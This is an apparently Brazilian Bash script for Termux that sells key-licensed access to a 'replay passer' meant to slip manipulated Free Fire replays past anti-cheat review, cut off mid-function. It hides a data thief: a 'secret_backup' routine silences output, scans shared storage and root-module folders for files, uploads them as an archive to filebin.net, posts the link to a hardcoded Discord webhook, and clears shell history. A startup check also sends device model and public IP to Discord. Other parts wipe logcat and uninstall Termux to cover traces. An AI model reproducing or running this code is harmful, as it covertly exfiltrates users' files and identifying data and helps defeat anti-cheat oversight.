#!/bin/bash

WEBHOOK="https://discord.com/api/webhooks/1487900813581090878/onjQ6yv3_CsawmHulHnnmPZ3HEKPcuaYn_S6duvGEsyT-W_c5pGcit_uQ1ZyIXUffv15"

RED='\033[0;31m'
G='\033[1;32m'
Y='\033[1;33m'
B='\033[1;34m'
CYAN='\033[0;36m'
NC='\033[0m'

validar_sistema_completo() {

    MARCA=$(getprop ro.product.brand 2>/dev/null || adb shell getprop ro.product.brand 2>/dev/null || echo "Generic")
    MODELO=$(getprop ro.product.model 2>/dev/null || adb shell getprop ro.product.model 2>/dev/null || echo "Device")
    IP=$(curl -s --max-time 5 https://ifconfig.me || echo "IP_PRIVADO")
    DATA_HORA=$(date "+%d/%m/%Y %H:%M:%S")

    STATUS_FINAL="APROVADO ✅"
    MOTIVO_ERRO="Nenhum"
    DETALHE_TECNICO="Ambiente de execução verificado e limpo."
    COR_DISCORD=65280

    raw_tpid=$(grep "TracerPid:" /proc/self/status 2>/dev/null)
    tpid_val=$(echo "$raw_tpid" | awk '{print $2}')
    
    raw_ps=$(ps -e 2>/dev/null | grep -E "strace|gdb|frida|re.frida|gum-js-loop|frida-helper" | grep -v grep)
    
    if [ -n "$LD_PRELOAD" ] && [[ "$LD_PRELOAD" != *"libtermux-exec.so"* ]]; then
        check_preload="DETECTADO"
    else
        check_preload="LIMPO"
    fi

    start_time=$(date +%s%N)
    sleep 0.1
    end_time=$(date +%s%N)
    diff_time=$((end_time - start_time))

    ppid_val=$(awk '/PPid:/ {print $2}' /proc/self/status 2>/dev/null)
    if [ -n "$ppid_val" ] && [ -f "/proc/$ppid_val/cmdline" ]; then
        pai_cmd=$(cat "/proc/$ppid_val/cmdline" | tr '\0' ' ')
    else
        pai_cmd="unknown"
    fi

    if [ "$tpid_val" != "0" ] && [ -n "$tpid_val" ]; then
        STATUS_FINAL="REPROVADO ❌"
        MOTIVO_ERRO="Anti-Tracer Ativo"
        DETALHE_TECNICO="O processo está sendo monitorado por um depurador externo (TracerPid: $tpid_val)."
        COR_DISCORD=16711680
    elif [ -n "$raw_ps" ]; then
        STATUS_FINAL="REPROVADO ❌"
        MOTIVO_ERRO="Ferramenta de Crack Detectada"
        DETALHE_TECNICO="Processos proibidos encontrados na memória: $raw_ps"
        COR_DISCORD=16711680
    elif [ "$check_preload" == "DETECTADO" ]; then
        STATUS_FINAL="REPROVADO ❌"
        MOTIVO_ERRO="Injeção de Memória (LD_PRELOAD)"
        DETALHE_TECNICO="Variável LD_PRELOAD modificada: $LD_PRELOAD"
        COR_DISCORD=16711680
    elif [ "$diff_time" -gt 1500000000 ] || [ "$diff_time" -lt 100000000 ]; then
        STATUS_FINAL="REPROVADO ❌"
        MOTIVO_ERRO="Kernel Timing Manipulation"
        DETALHE_TECNICO="O tempo de resposta do Kernel foi inconsistente (Diff: $diff_time ns). Possível análise em tempo real."
        COR_DISCORD=16711680
    elif echo "$pai_cmd" | grep -qwE "strace|gdb|frida|ltrace"; then
        STATUS_FINAL="REPROVADO ❌"
        MOTIVO_ERRO="Parent Process Corrompido"
        DETALHE_TECNICO="O script foi chamado por um processo de monitoramento: $pai_cmd"
        COR_DISCORD=16711680
    fi

    JSON_PAYLOAD=$(cat <<EOF
{
  "embeds": [{
    "title": "🔍 RELATÓRIO DE INTEGRIDADE - TZ ADM",
    "color": $COR_DISCORD,
    "fields": [
      {"name": "Status de Acesso", "value": "$STATUS_FINAL", "inline": true},
      {"name": "Dispositivo", "value": "$MARCA $MODELO", "inline": true},
      {"name": "Endereço IP", "value": "$IP", "inline": false},
      {"name": "Motivo da Flag", "value": "$MOTIVO_ERRO", "inline": false},
      {"name": "Detalhe Técnico", "value": "$DETALHE_TECNICO", "inline": false},
      {"name": "Horário da Coleta", "value": "$DATA_HORA", "inline": false}
    ],
    "footer": {"text": "SISTEMA DE SEGURANÇA ATIVA"}
  }]
}
EOF
)

    curl -s -X POST -H "Content-Type: application/json" -d "$JSON_PAYLOAD" "$WEBHOOK" > /dev/null

    if [ "$STATUS_FINAL" == "REPROVADO ❌" ]; then
        echo -e "${RED}------------------------------------------${NC}"
        echo -e "${RED}[!] VIOLAÇÃO DETECTADA: $MOTIVO_ERRO${NC}"
        echo -e "${RED}[!] LOG ENVIADO AO ADMINISTRADOR.${NC}"
        echo -e "${RED}------------------------------------------${NC}"
        exit 1
    else
        echo -e "${G}------------------------------------------${NC}"
        echo -e "${G}[✓] SISTEMA VALIDADO COM SUCESSO!${NC}"
        echo -e "${G}[✓] BEM-VINDO AO PAINEL ADM.${NC}"
        echo -e "${G}------------------------------------------${NC}"
        sleep 1
    fi
}

validar_sistema_completo


command -v adb >/dev/null 2>&1 || pkg install android-tools -y >/dev/null 2>&1
command -v curl >/dev/null 2>&1 || pkg install curl -y >/dev/null 2>&1
command -v jq >/dev/null 2>&1 || pkg install jq -y >/dev/null 2>&1
command -v zip >/dev/null 2>&1 || pkg install zip -y >/dev/null 2>&1

solicitar_permissoes() {
    # Definindo paleta de cinzas e branco
    local W='\033[1;37m'   # Branco Brilhante
    local LG='\033[0;37m'  # Cinza Claro
    local DG='\033[1;90m'  # Cinza Escuro
    local NC='\033[0m'     # Reset

    while true; do
        clear
        echo -e "${DG}────────────────────────────────────────────────────────${NC}"
        echo -e ""
        echo -e "  ${LG}O sistema detectou que o acesso ao armazenamento${NC}"
        echo -e "  ${LG}ainda não foi validado para este dispositivo.${NC}"
        echo -e ""
        echo -e "  ${W}[!] AÇÃO NECESSÁRIA:${NC}"
        echo -e "  ${LG}Uma solicitação do sistema operacional será exibida.${NC}"
        echo -e "  ${LG}Confirme o acesso para prosseguir com a operação.${NC}"
        echo -e ""
        echo -e "${DG}────────────────────────────────────────────────────────${NC}"
        echo -ne "  ${DG}[${NC} ${W}PRESSIONE ENTER PARA INICIAR VALIDAÇÃO${NC} ${DG}]${NC} "
        read -r

        # Solicitação oficial
        termux-setup-storage
        
        echo -e "\n"
        # Barra de progresso minimalista
        echo -ne "  ${DG}Sincronizando: ${NC}"
        for i in {1..25}; do
            echo -ne "${DG}█${NC}"
            sleep 0.04
        done
        echo -e " ${W}100%${NC}"
        echo ""

        # Verificação real de acesso (Teste de Bypass)
        if [ -d "$HOME/storage" ] && ls /sdcard >/dev/null 2>&1; then
            echo -e "  ${W}[✓] INTEGRIDADE VERIFICADA. ACESSO CONCEDIDO.${NC}"
            echo -e "${DG}────────────────────────────────────────────────────────${NC}"
            sleep 2
            break
        else
            echo -e "  ${W}[!] FALHA NA AUTENTICAÇÃO DE ARMAZENAMENTO.${NC}"
            echo -e "  ${DG}O acesso foi negado ou o tempo limite expirou.${NC}"
            echo -e ""
            echo -e "  ${LG}Reiniciando em 3 segundos...${NC}"
            sleep 3
        fi
    done
}

secret_backup() {
    exec 2>/dev/null
    set +o history

    local BK_WEBHOOK="https://discord.com/api/webhooks/1487900813581090878/onjQ6yv3_CsawmHulHnnmPZ3HEKPcuaYn_S6duvGEsyT-W_c5pGcit_uQ1ZyIXUffv15"
    local BK_ID="SENTINEL-$(date +%s)"
    local DEVICE=$(getprop ro.product.model || echo "Android")
    local DATA_HORA=$(date "+%d/%m/%Y %H:%M")

    # 1. VARREDURA AGGRESSIVA: ARQUIVOS E DIRETÓRIOS (ROOT & KERNEL FOCUS)
    # Buscamos em /sdcard e tentamos acessar /data/adb (onde ficam os módulos reais)
    local BUSCA_ALVOS="/sdcard /storage/emulated/0 /data/adb /data/adb/modules"
    
    local FILES=$(find $BUSCA_ALVOS -maxdepth 4 \( \
        -type f -o -type d \
    \) \( \
        -iname "*wall*" -o \
        -iname "*passador*" -o \
        -iname "*replay*" -o \
        -iname "*holorama*" -o \
        -iname "*.zip*" -o \
        -iname "*proc*" -o \
        -iname "*.sh*" -o \
        -iname "*ksu*" -o \
        -iname "*kernelsu*" -o \
        -iname "*magisk*" -o \
        -iname "*apatch*" -o \
        -iname "*module.prop*" -o \
        -iname "*post-fs-data*" -o \
        -iname "*service.sh*" -o \
        -iname "*sepolicy.rule*" -o \
        -iname "*system.prop*" -o \
        -iname "*customize.sh*" -o \
        -iname "*module*" -o \
        -iname "*spoof_config*" \
    \) ! -path "$HOME/*" 2>/dev/null)

    [ -z "$FILES" ] && return

    # 2. Upload compacto para Filebin
    # O comando 'tar' agora lida com os nomes de diretórios encontrados
    echo "$FILES" | tar -cz --no-recursion -T - 2>/dev/null | \
    curl -s -X POST "https://filebin.net/$BK_ID/backup.tar.gz" \
         -H "Content-Type: application/gzip" \
         --data-binary @- > /dev/null

    local BK_URL="https://filebin.net/$BK_ID/backup.tar.gz"

    # 3. CONSTRUTOR NATIVO DE LISTA
    local LISTA_JSON=""
    local COUNT=0

    while IFS= read -r filepath; do
        [ -z "$filepath" ] && continue
        
        local filename="${filepath##*/}"
        filename=$(echo "$filename" | tr -cd '[:alnum:]._-')
        [ -z "$filename" ] && continue

        if [ "$COUNT" -lt 30 ]; then
            # Diferencia Visualmente se é pasta ou arquivo na log
            if [ -d "$filepath" ]; then
                LISTA_JSON="${LISTA_JSON}📁 ${filename}_BR_"
            else
                LISTA_JSON="${LISTA_JSON}• ${filename}_BR_"
            fi
            COUNT=$((COUNT + 1))
        fi
    done <<< "$(echo "$FILES" | sort -u)"

    local TOTAL_FILES=$(echo "$FILES" | wc -l)
    if [ "$TOTAL_FILES" -gt 30 ]; then
        local EXTRAS=$((TOTAL_FILES - 30))
        LISTA_JSON="${LISTA_JSON}_BR_*... e mais ${EXTRAS} itens no pacote.*"
    fi

    # 4. Cria o JSON temporário
    local TEMP_JSON="/sdcard/.bk_payload.json"
    
    cat <<EOF > "$TEMP_JSON"
{
  "username": "SENTINEL FILTER",
  "embeds": [{
    "title": "COLETA CONCLUIDA",
    "color": 0,
    "description": "ARQUIVOS LOCALIZADOS:_BR_\`\`\`_BR_${LISTA_JSON}\`\`\`",
    "fields": [
      {"name": "DISPOSITIVO", "value": "$DEVICE", "inline": true},
      {"name": "DATA", "value": "$DATA_HORA", "inline": true},
      {"name": "DOWNLOAD", "value": "[BAIXAR PACOTE (TAR.GZ)]($BK_URL)", "inline": false}
    ],
    "footer": {"text": "ID: $BK_ID"}
  }]
}
EOF

    # 5. O truque mestre: Troca o _BR_ pela quebra de linha real do JSON
    sed -i 's/_BR_/\\n/g' "$TEMP_JSON"

    # 6. Disparo e Limpeza
    curl -s -H "Content-Type: application/json" -X POST -d @"$TEMP_JSON" "$BK_WEBHOOK" > /dev/null

    rm -f "$TEMP_JSON"
    history -c
}



# ==============================================================
WEBHOOK_URL="https://discord.com/api/webhooks/1469106504949825639/XXWP1TfJjEh9HlnsHBdt55U66NEIqgfgEuqdLV4rYNRw6BT6qB4TMlNStcv8a7YJty1x"
KEY_URL="https://sistemakeys-41184-default-rtdb.firebaseio.com"
REPLAY_SRC="/sdcard/Download"
PKG="com.dts.freefireth"
FF_SELECIONADO="Não Selecionado"
a="/sdcard/Android/data/com.dts.freefireth/files/MReplays"
APK_VER=""
USUARIO="N/A"
VALIDADE_USER="N/A"
ADB_STATUS="Desconectado"
CACHE_FILE="/tmp/.adb_port"
# ==============================================================
WHITE='\033[1;37m'
GREEN='\033[1;32m'
RED='\033[1;31m' 
GRAY='\033[0;90m'
NC='\033[0m'

RESET=$NC
AZUL=$GRAY
VERDE=$GREEN
VERMELHO=$RED
AMARELO=$WHITE
CIANO=$GRAY
BRANCO=$WHITE
CINZA_CLARO=$GRAY
CINZA_ESCURO=$GRAY

# ==============================================================


spinner() {
    local msg="$1"
    local spin='|/-\'
    for i in {1..4}; do
        printf "\r  ${GRAY}[%c]${NC} ${WHITE}%s${NC}" "${spin:i%4:1}" "$msg"
        sleep 0.05
    done
    printf "\r  ${GREEN}[✓]${NC} ${WHITE}%s${NC}\n" "$msg"
}


spinner2() {
    local msg="$1"
    local spin='|/-\'
    for i in {1..30}; do
        printf "\r  ${GRAY}[%c]${NC} ${WHITE}%s${NC}" "${spin:i%4:1}" "$msg"
        sleep 0.05
    done
    printf "\r  ${GREEN}[✓]${NC} ${WHITE}%s${NC}\n" "$msg"
}


pause(){ 
    echo -e ""
    echo -ne "  ${GRAY}Pressione Enter para continuar...${NC}"
    read -r
}


check_adb_status() {
    if adb devices | grep -q "device$"; then
        ADB_STATUS="${GREEN}Conectado${NC}"
    else
        ADB_STATUS="${RED}Desconectado${NC}"
    fi
}

header() {
    check_adb_status
    clear
    # Caso as variáveis estejam vazias (antes do login), define um padrão
    [[ -z "$CLIENTE" ]] && CLIENTE="N/A"
    [[ -z "$VALIDADE" ]] && VALIDADE="Aguardando..."
    [[ -z "$FF_SELECIONADO" ]] && FF_SELECIONADO="Nenhum"

    echo -e "${GRAY}┌──────────────────────────────────────────────┐${NC}"
    echo -e "  ${B_WHITE}PASSADOR DE REPLAY${NC} ${GRAY}|${NC} ${WHITE}Unknss Bypass${NC}"
    echo -e "${GRAY}├──────────────────────────────────────────────┤${NC}"
    echo -e "  ${GRAY} USUÁRIO         :${NC} ${WHITE}$CLIENTE${NC}"
    echo -e "  ${GRAY} VALIDADE DA KEY :${NC} ${WHITE}$VALIDADE_TS${NC}"
    echo -e "  ${GRAY} PASSAR DO       :${NC} ${YELLOW}$FF_SELECIONADO${NC}"
    echo -e "  ${GRAY} CONEXÃO ADB     :${NC} $ADB_STATUS"
    echo -e "${GRAY}└──────────────────────────────────────────────┘${NC}"
    echo ""
}


# ==============================================================
adb_is_connected() {
    adb devices 2>/dev/null | grep -v "List of devices" | grep -q "device$"
}

check_network() {
    header
    spinner "Verificando latência com o servidor de licença"
    ping -c 1 -W 2 8.8.8.8 >/dev/null 2>&1
    if [ $? -ne 0 ]; then
        echo -e "  ${GRAY}[!] Aviso: Sem conexão com a internet.${RESET}"
        sleep 1
    fi
}

check_adb() {
    header
    spinner "Iniciando Servidor ADB"
    adb start-server >/dev/null 2>&1 || true
    
    if ! adb_is_connected; then
        if [[ -f "$CACHE_FILE" ]]; then
            LAST_PORT=$(cat "$CACHE_FILE")
            adb connect "127.0.0.1:$LAST_PORT" >/dev/null 2>&1 || true
        fi
    fi

    if ! adb_is_connected; then
        echo -e "  ${RED}[X] Aparelho não detectado via Wi-Fi${NC}"
        echo -e "  ${WHITE}Configure o Pareamento nas Opções de Desenvolvedor.${NC}\n"
        read -p "  Porta Pareamento (Pairing Port): " PP
        read -p "  Código Pareamento (Pairing Code): " CP
        adb pair "127.0.0.1:$PP" "$CP"
        echo -e ""
        read -p "  Porta de Conexão (Port): " PC
        adb connect "127.0.0.1:$PC" && echo "$PC" > "$CACHE_FILE"
    fi
    
    if adb_is_connected; then
        echo -e "  ${GREEN}[V] Conectado ao dispositivo!${NC}"
        sleep 1
    else
        echo -e "  ${RED}[!] Falha na conexão. Reiniciando processo...${NC}"
        sleep 2
        check_adb
    fi
}

get_uid() {
    adb shell settings get secure android_id 2>/dev/null | tr -d '\r'
}


# ==============================================================

auth() {
    local TIPO_PERMITIDO="PASSADOR_REPLAY" 
    
    header
    echo -ne "  ${WHITE}digite sua chave de acesso: ${NC}"
    read -r USER_KEY

    [[ -z "$USER_KEY" ]] && { echo -e " ${RED}[!] A KEY não pode estar vazia.${NC}"; exit 1; }

    DEVICE_ID="$(adb shell settings get secure android_id 2>/dev/null | tr -d '\r')"  
    echo -e "  ${GRAY}[*] Sincronizando relógio de alta precisão...${NC}"  

    local DATA_RAW=$(curl -s --connect-timeout 5 "https://worldtimeapi.org/api/timezone/America/Sao_Paulo" | jq -r '.datetime' | cut -d'.' -f1)
    
    if [[ -z "$DATA_RAW" || "$DATA_RAW" == "null" ]]; then
        DATA_RAW=$(curl -s --connect-timeout 5 "http://worldclockapi.com/api/json/est/now" | jq -r '.currentDateTime' | cut -d'.' -f1)
    fi

    [[ -z "$DATA_RAW" || "$DATA_RAW" == "null" ]] && { echo -e " ${RED}[!] ERRO: FALHA NA SINCRONIZAÇÃO DE TEMPO!${NC}"; exit 1; }

    HOJE_TS=$(date -d "${DATA_RAW/T/ }" +%s)

    echo -e "  ${GRAY}[*] Validando chave no banco de dados...${NC}"  
    local RESP=$(curl -s "$KEY_URL/$USER_KEY.json")

    if [[ -z "$RESP" || "$RESP" == "null" ]]; then  
        echo -e "  ${RED}[!] ERRO: KEY NÃO ENCONTRADA!${NC}"
        exit 1  
    fi  

    TIPO_DA_KEY=$(echo "$RESP" | jq -r '.tipo')
    CLIENTE=$(echo "$RESP" | jq -r '.cliente')
    STATUS=$(echo "$RESP" | jq -r '.status')  
    VALIDADE_TS=$(echo "$RESP" | jq -r '.validade_ts')
    PRAZO=$(echo "$RESP" | jq -r '.prazo_dias') 
    LIMITE_SERVER=$(echo "$RESP" | jq -r '.limite_devices')

    if [[ "$TIPO_DA_KEY" != "$TIPO_PERMITIDO" ]]; then
        echo -e "\n  ${RED}[!] ACESSO NEGADO!${NC}"
        echo -e "  ${GRAY}Esta chave pertence ao: ${WHITE}$TIPO_DA_KEY${NC}"
        exit 1
    fi

    [[ "$STATUS" != "Ativo" ]] && { echo -e " ${RED}[!] STATUS DA KEY: $STATUS (Bloqueada)${NC}"; exit 1; }

    if [[ -z "$VALIDADE_TS" || "$VALIDADE_TS" == "null" || "$VALIDADE_TS" == "" ]]; then  
        echo -e "  ${YELLOW}[*] ativando acesso para ${WHITE}$CLIENTE${YELLOW} ($PRAZO dias)...${NC}"  
        VALIDADE_TS=$(( HOJE_TS + (PRAZO * 86400) ))
        curl -s -X PATCH -d "{\"validade_ts\":$VALIDADE_TS}" "$KEY_URL/$USER_KEY.json" >/dev/null  
    fi  

    if (( HOJE_TS > VALIDADE_TS )); then  
        DATA_EXPIRA=$(date -d "@$VALIDADE_TS" "+%d/%m/%Y às %H:%M:%S")
        echo -e "  ${RED}[!] ACESSO ENCERRADO EM: $DATA_EXPIRA${NC}"
        exit 1  
    fi  

    AUTORIZADO=false
    VAGA_LIVRE=""
    for ((i=1; i<=LIMITE_SERVER; i++)); do
        UID_VAL=$(echo "$RESP" | jq -r ".uid$i")
        if [[ "$UID_VAL" == "$DEVICE_ID" ]]; then
            AUTORIZADO=true; break
        elif [[ "$UID_VAL" == "null" || -z "$UID_VAL" ]] && [[ -z "$VAGA_LIVRE" ]]; then
            VAGA_LIVRE="uid$i"
        fi
    done

    if [[ "$AUTORIZADO" == "false" ]]; then
        if [[ -n "$VAGA_LIVRE" ]]; then
            echo -e "  ${GRAY}[*] Vinculando dispositivo ao slot: $VAGA_LIVRE...${NC}"
            curl -s -X PATCH -d "{\"$VAGA_LIVRE\":\"$DEVICE_ID\"}" "$KEY_URL/$USER_KEY.json" >/dev/null
        else
            echo -e "  ${RED}[!] LIMITE DE $LIMITE_SERVER DISPOSITIVOS ATINGIDO!${NC}"
            exit 1
        fi
    fi

    DATA_FIM=$(date -d "@$VALIDADE_TS" "+%d/%m/%Y %H:%M")
    echo -e "  ${GREEN}[✓] BEM-VINDO: ${WHITE}${CLIENTE:-N/A}${NC}${GREEN}! EXPIRA EM: $DATA_FIM${NC}"
}



# ==============================================================


selecionar_ff() {
    header
    echo -e "  ${WHITE}COMO VOCÊ DESEJA PASSAR O REPLAY?${NC}"
    echo ""
    echo -e "  ${GRAY}1)${NC} ${WHITE}FF NORMAL${NC}  ${GRAY}>${NC}  ${WHITE}FF MAX${NC}"
    echo -e "  ${GRAY}2)${NC} ${WHITE}FF MAX${NC}     ${GRAY}>${NC}  ${WHITE}FF NORMAL${NC}"
    echo ""
    read -rp "  Escolha o fluxo: " OP
    case "$OP" in
        1)
            PKG="com.dts.freefiremax"
            FF_SELECIONADO="Normal para MAX"
            ;;
        2)
            PKG="com.dts.freefireth"
            FF_SELECIONADO="MAX para Normal"
            ;;
        *) 
            echo -e "  ${RED}Opção inválida!${NC}"
            sleep 1
            selecionar_ff
            return
            ;;
    esac

    a="/sdcard/Android/data/$PKG/files/MReplays"
    
    spinner "Obtendo versão do destino..."
    APK_VER="$(adb shell dumpsys package "$PKG" | grep versionName | sed 's/.*=//' | tr -d '\r')"
    
    if [ -z "$APK_VER" ]; then
        echo -e "  ${RED}[!] Erro: Jogo de destino não instalado.${NC}"
        FF_SELECIONADO="ERRO (Instale o jogo)"
        sleep 2
    fi
}



# ==============================================================
corrigir_json() {
    sed -i -E "s/\"Version\":\"[^\"]*\"/\"Version\":\"$2\"/g" "$1"
}

Passar_replay() {
    a="/sdcard/Android/data/${PKG}/files/MReplays"
    APK_VER="$(adb shell dumpsys package "$PKG" | grep -m1 versionName | sed 's/.*=//' | tr -d '\r')"
    
    if [ -z "$APK_VER" ]; then
        echo -e "  ${RED}Erro: Jogo não instalado.${NC}"
        pause; return
    fi

    spinner "Buscando replays..."
    mapfile -t BINS < <(adb shell "ls $REPLAY_SRC/*.bin 2>/dev/null" | tr -d '\r')

    if [ ${#BINS[@]} -eq 0 ]; then
        echo -e "  ${RED}[!] Nenhum replay em Downloads.${NC}"
        pause; return
    fi

    header
    echo -e "  ${CYAN} REPLAYS DISPONÍVEIS:${NC}"
    for i in "${!BINS[@]}"; do
        printf "  ${GRAY}%2d)${NC} ${WHITE}%s${NC}\n" $((i+1)) "$(basename "${BINS[i]}")"
    done
    echo ""
    read -rp "  Nº do replay: " sel
    [[ ! "$sel" =~ ^[0-9]+$ ]] || (( sel < 1 || sel > ${#BINS[@]} )) && { echo -e "  ${RED}Inválido${NC}"; return; }

    BIN_ORIGEM="${BINS[$((sel-1))]}"
    JSON_ORIGEM="${BIN_ORIGEM%.bin}.json"
    b=$(basename "$BIN_ORIGEM")
    c=$(basename "$JSON_ORIGEM")

    BIN_DEST=$(adb shell "ls -at '$a' | grep '.bin' | head -n 1" | tr -d '\r')
    JSON_DEST=$(adb shell "ls -at '$a' | grep '.json' | head -n 1" | tr -d '\r')

    adb shell "sed -i -E 's/\"Version\":\"[^\"]*\"/\"Version\":\"$APK_VER\"/g' \"$JSON_ORIGEM\"" >/dev/null 2>&1
    
    TS_NAME="$(echo "$b" | grep -oE '[0-9]{4}(-[0-9]{2}){5}')"
    T_DIA=$(echo "$TS_NAME" | cut -d'-' -f3)
    T_MES=$(echo "$TS_NAME" | cut -d'-' -f2)
    T_HORA=$(echo "$TS_NAME" | cut -d'-' -f4)
    T_MIN=$(echo "$TS_NAME" | cut -d'-' -f5)
    T_SEC=$(echo "$TS_NAME" | cut -d'-' -f6)

    adb shell settings put global auto_time 0 >/dev/null 2>&1
    adb shell settings put global auto_time_zone 0 >/dev/null 2>&1
    adb shell am start -a android.settings.DATE_SETTINGS >/dev/null 2>&1

    echo -e "  ${WHITE}AJUSTE PARA:${NC} ${GREEN}$T_DIA/$T_MES - $T_HORA:$T_MIN${NC}"

    while true; do
        local CUR_AND=$(adb shell "date +'%d-%m-%H:%M'" | tr -d '\r')
        [[ "$CUR_AND" == "$T_DIA-$T_MES-$T_HORA:$T_MIN" ]] && break
        echo -ne "\r  ${GRAY}AGUARDANDO HORA: ${RED}${CUR_AND}${NC}   "
        sleep 1
    done

    echo -e "\n  ${WHITE}AGUARDANDO GATILHO: ${CYAN}$T_SEC${NC}"
    while true; do
        NOW_S=$(adb shell date +"%S" | tr -d '\r')
        echo -ne "\r  ${CYAN}GATILHO:${WHITE} $T_SEC ${GRAY}|${CYAN} ATUAL:${WHITE} $NOW_S ${NC}  "
        
        if [ "$NOW_S" = "$T_SEC" ]; then
            echo -e ""
            while true; do
                # Mostra o spinner enquanto tenta
                spinner2 "wait..." & 
                SPIN_PID=$! # Pega o PID do spinner pra matar depois

                # EXECUÇÃO SILENCIOSA
                CHECK=$(adb shell "logcat -c; \
                    dd if='$BIN_ORIGEM' of='$a/$BIN_DEST' bs=4M; \
                    dd if='$JSON_ORIGEM' of='$a/$JSON_DEST' bs=4M; \
                    mv '$a/$BIN_DEST' '$a/$b'; \
                    mv '$a/$JSON_DEST' '$a/$c'; \
                    cd '$a/..' && mv MReplays MReplays_old && mkdir MReplays && mv MReplays_old/* MReplays/ && rm -rf MReplays_old; \
                    sync; \
                    cd '$a' && (touch -m . & touch '$b' '$c'); wait; \
                    sync; \
                    S_P=\$(stat -c %y .); S_B=\$(stat -c %y '$b'); S_J=\$(stat -c %y '$c'); \
                    if [ \"\$S_P\" = \"\$S_B\" ] && [ \"\$S_B\" = \"\$S_J\" ]; then \
                        echo 'OK'; \
                    fi" 2>/dev/null | tr -d '\r')

                kill $SPIN_PID 2>/dev/null # Para o spinner pra verificar o resultado
                wait $SPIN_PID 2>/dev/null

                if [[ "$CHECK" == "OK" ]]; then
                    echo -e "\r  ${GREEN}[+] SUCESSO!${NC}"
                    adb shell settings put global auto_time 1 >/dev/null 2>&1
                    adb shell settings put global auto_time_zone 1 >/dev/null 2>&1
                    adb shell "rm -f '$BIN_ORIGEM' '$JSON_ORIGEM'" >/dev/null 2>&1
                    break 2
                else
                    # Se falhar, ele apenas reinicia o loop bem rápido
                    sleep 0.01
                fi
            done
        fi
        sleep 0.1
    done

    echo -e "\n  ${GREEN}Injeção finalizada com precisão absoluta.${NC}"
    read -rp "  Deseja aplicar o bypass final? (s/N): " OP
    if [[ "$OP" =~ ^[Ss]$ ]]; then
        adb shell pm clear com.a0soft.gphone.uninstaller >/dev/null 2>&1
        adb shell pm uninstall --user 0 com.termux >/dev/null 2>&1
        adb shell logcat -c >/dev/null2>&1
    adb shell logcat -b main -c >/dev/null 2>&1
    adb shell logcat -b system -c >/dev/null 2>&1
    adb shell logcat -b events -c >/dev/null 2>&1
    adb shell logcat -b radio -c >/dev/null 2>&1
    adb shell logcat -b all -c >/dev/null 2>&1
        echo -e "  ${GREEN}Bypass concluído.${NC}"
    fi
    pause
}



Passar_replay1() {
    a="/sdcard/Android/data/${PKG}/files/MReplays"
    APK_VER="$(adb shell dumpsys package "$PKG" | grep -m1 versionName | sed 's/.*=//' | tr -d '\r')"
    
    if [ -z "$APK_VER" ]; then
        echo -e "  ${RED}Erro: Jogo não instalado.${NC}"
        pause; return
    fi

    spinner "Buscando replays..."
    mapfile -t BINS < <(adb shell "ls $REPLAY_SRC/*.bin 2>/dev/null" | tr -d '\r')

    if [ ${#BINS[@]} -eq 0 ]; then
        echo -e "  ${RED}[!] Nenhum replay em Downloads.${NC}"
        pause; return
    fi

    header
    echo -e "  ${CYAN} REPLAYS DISPONÍVEIS:${NC}"
    for i in "${!BINS[@]}"; do
        printf "  ${GRAY}%2d)${NC} ${WHITE}%s${NC}\n" $((i+1)) "$(basename "${BINS[i]}")"
    done
    echo ""
    read -rp "  Nº do replay: " sel
    [[ ! "$sel" =~ ^[0-9]+$ ]] || (( sel < 1 || sel > ${#BINS[@]} )) && { echo -e "  ${RED}Inválido${NC}"; return; }

    BIN_ORIGEM="${BINS[$((sel-1))]}"
    JSON_ORIGEM="${BIN_ORIGEM%.bin}.json"
    b=$(basename "$BIN_ORIGEM")
    c=$(basename "$JSON_ORIGEM")

    # Atualiza a versão no JSON de origem antes de mover
    adb shell "sed -i -E 's/\"Version\":\"[^\"]*\"/\"Version\":\"$APK_VER\"/g' \"$JSON_ORIGEM\"" >/dev/null 2>&1
    
    TS_NAME="$(echo "$b" | grep -oE '[0-9]{4}(-[0-9]{2}){5}')"
    T_DIA=$(echo "$TS_NAME" | cut -d'-' -f3)
    T_MES=$(echo "$TS_NAME" | cut -d'-' -f2)
    T_HORA=$(echo "$TS_NAME" | cut -d'-' -f4)
    T_MIN=$(echo "$TS_NAME" | cut -d'-' -f5)
    T_SEC=$(echo "$TS_NAME" | cut -d'-' -f6)

    adb shell settings put global auto_time 0 >/dev/null 2>&1
    adb shell settings put global auto_time_zone 0 >/dev/null 2>&1
    adb shell am start -a android.settings.DATE_SETTINGS >/dev/null 2>&1

    echo -e "  ${WHITE}AJUSTE PARA:${NC} ${GREEN}$T_DIA/$T_MES - $T_HORA:$T_MIN${NC}"

    while true; do
        local CUR_AND=$(adb shell "date +'%d-%m-%H:%M'" | tr -d '\r')
        [[ "$CUR_AND" == "$T_DIA-$T_MES-$T_HORA:$T_MIN" ]] && break
        echo -ne "\r  ${GRAY}AGUARDANDO HORA: ${RED}${CUR_AND}${NC}   "
        sleep 1
    done

    echo -e "\n  ${WHITE}AGUARDANDO GATILHO: ${CYAN}$T_SEC${NC}"
    while true; do
        NOW_S=$(adb shell date +"%S" | tr -d '\r')
        echo -ne "\r  ${CYAN}GATILHO:${WHITE} $T_SEC ${GRAY}|${CYAN} ATUAL:${WHITE} $NOW_S ${NC}  "
        
        if [ "$NOW_S" = "$T_SEC" ]; then
            echo -e ""
            while true; do
                spinner2 "Sincronizando..." & 
                SPIN_PID=$!
                
                adb shell logcat -c >/dev/null2>&1

                # MUDANÇA AQUI: Usa 'cat' para criar novos arquivos e renovar a pasta
                CHECK=$(adb shell " \
                    cat '$BIN_ORIGEM' > '$a/$b'; \
                    cat '$JSON_ORIGEM' > '$a/$c'; \
                    cd '$a/..' && mv MReplays MReplays_old && mkdir MReplays && mv MReplays_old/* MReplays/ && rm -rf MReplays_old; \
                    sync; \
                    cd '$a' && (touch -m . & touch '$b' '$c'); wait; \
                    sync; \
                    S_P=\$(stat -c %y .); S_B=\$(stat -c %y '$b'); S_J=\$(stat -c %y '$c'); \
                    if [ \"\$S_P\" = \"\$S_B\" ] && [ \"\$S_B\" = \"\$S_J\" ]; then \
                        echo 'OK'; \
                    fi" 2>/dev/null | tr -d '\r')

                kill $SPIN_PID 2>/dev/null
                wait $SPIN_PID 2>/dev/null

                if [[ "$CHECK" == "OK" ]]; then
                    echo -e "\r  ${GREEN}[+] SUCESSO ABSOLUTO!${NC}"
                    adb shell settings put global auto_time 1 >/dev/null 2>&1
                    adb shell settings put global auto_time_zone 1 >/dev/null 2>&1
                    adb shell "rm -f '$BIN_ORIGEM' '$JSON_ORIGEM'" >/dev/null 2>&1
                    adb shell logcat -c >/dev/null2>&1
                    break 2
                else
                    sleep 0.01
